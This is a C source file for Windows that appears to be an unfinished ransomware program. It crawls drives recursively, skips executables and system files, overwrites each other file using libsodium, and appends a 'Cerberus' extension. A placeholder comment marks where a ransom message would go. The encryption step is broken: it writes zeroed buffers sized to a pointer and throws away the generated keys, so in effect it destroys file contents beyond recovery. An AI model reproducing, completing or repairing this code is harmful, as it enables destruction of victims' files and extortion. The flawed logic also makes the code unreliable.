#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#define ext "Cerberus"
#define POINT
#include <sodium.h>
#include    <sodium/crypto_box.h>

void Encrypt_File(char *filename)
{
	char *in = NULL, *out = NULL;
	HANDLE file_fd = NULL;
	DWORD file_size = 0, written_bytes, read_bytes, cnt = 0, ThreadID = 0, Orig;

	char ransom_name[MAX_PATH];


	if ((file_fd = CreateFile(filename, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
	{
		/* Fail to open */
		return;
	}

	file_size = GetFileSize(file_fd, NULL);

	if (file_size == 0xFFFFFFFF)
	{
		/* Fail to get size */
		CloseHandle(file_fd);
		return;
	}

	/* filesize % 8 == 0 */
	if (file_size % 8 != 0)
	{
		file_size = ((file_size / 8) + 1) * 8;
	}

	/* Ok, allocate memory */
	in = (char *)GlobalAlloc(GMEM_FIXED | GMEM_ZEROINIT, file_size);
	out = (char *)GlobalAlloc(GMEM_FIXED | GMEM_ZEROINIT, file_size);

	if (in == NULL || out == NULL)
	{
		/* Fail to allocate memory */
		CloseHandle(file_fd);
		return;
	}

#define FREE_ALL GlobalFree(in); \
	             GlobalFree(out); \
	             CloseHandle(file_fd);

	/* Read entire file in buf */
	if (ReadFile(file_fd, in, file_size, &read_bytes, NULL) == 0)
	{
		/* Fail to read */
		FREE_ALL
			return;
	}

	/* Write encrypted version */
	SetFilePointer(file_fd, 0, 0, FILE_BEGIN);
	
	/* Encrypt ! */
	unsigned char recipient_pk[crypto_box_PUBLICKEYBYTES];
	unsigned char recipient_sk[crypto_box_SECRETKEYBYTES];
	crypto_box_keypair(recipient_pk, recipient_sk);

	/* Anonymous sender encrypts a message using an ephemeral key pair
	 * and the recipient's public key */

	unsigned char ciphertext[crypto_box_SEALBYTES+sizeof(out)];
	crypto_box_seal(ciphertext, out, sizeof(out),recipient_pk);

	if (WriteFile(file_fd, out, file_size, &written_bytes, NULL) == 0)
	{
		/* Fail to write */
		FREE_ALL
			return;
	}

	/* Free */
	FREE_ALL

		/* Rename */
		strcpy(ransom_name, filename);
	strcat(ransom_name, ext);
	MoveFile(filename, ransom_name);

	/* Increment :) */


	 /* MsG for user */

}

/* This is the function used to scan drives for files */
void S3arch(char *pt) {
	char sc[MAX_PATH], buf[MAX_PATH];
	WIN32_FIND_DATA in;
	HANDLE fd, file;
	char *fm = "%s\\%s", *fm1 = "%s\\*.*";

	if (strlen(pt) == 3)
	{
		pt[2] = '\0'; /* :-) */
	}

	sprintf(sc, fm1, pt);
	fd = FindFirstFile(sc, &in);

	do
	{

		sprintf(buf, fm, pt, in.cFileName);

		/* dot :) */
		if (strcmp(in.cFileName, "..") != 0 && strcmp(in.cFileName, ".") != 0 && (in.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
		{
			S3arch(buf);
		}

		/* File found */
		else
		{

			/* is it good to encrypt ? */

			if (!strstr(in.cFileName, ext) && !strstr(in.cFileName, ".dll")
				&& !strstr(in.cFileName, ".exe") && !strstr(in.cFileName, ".ini") &&
				!strstr(in.cFileName, ".vxd") && !strstr(in.cFileName, ".drv") &&
				strcmp(in.cFileName, "..") != 0 && strcmp(in.cFileName, ".") != 0)
			{
				Encrypt_File(buf);
			}
		}

	} while (FindNextFile(fd, &in));

	FindClose(fd);

}
int main() {
	printf(" testando");

	S3arch("C:\\Users\\estan\\Downloads\\Win32.RansomWar (2)");
	/* Recipient creates a long-term key pair */
	
	return 0;
}
